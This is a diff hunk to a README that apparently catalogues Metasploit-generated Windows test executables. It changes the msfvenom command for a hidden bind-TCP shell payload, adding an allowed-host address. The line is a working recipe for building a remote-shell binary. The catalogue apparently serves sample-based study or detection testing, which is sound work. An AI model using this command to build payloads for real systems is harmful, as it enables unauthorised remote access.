@@ -86,7 +86,7 @@ In this folder each file is an x86 windows executable. Here is each of the files
 - `windows_shell_hidden_bind_tcp.exe`
 
    ```{bash}
-   msfvenom --payload windows/shell_bind_tcp -f exe -a x86 -o windows_shell_bind_tcp.exe
+   msfvenom --payload windows/shell_hidden_bind_tcp AHOST=10.0.2.15 -f exe -a x86 -o windows_shell_hidden_bind_tcp.exe
    ```
 
 - `windows_pingback_bind_tcp.exe`
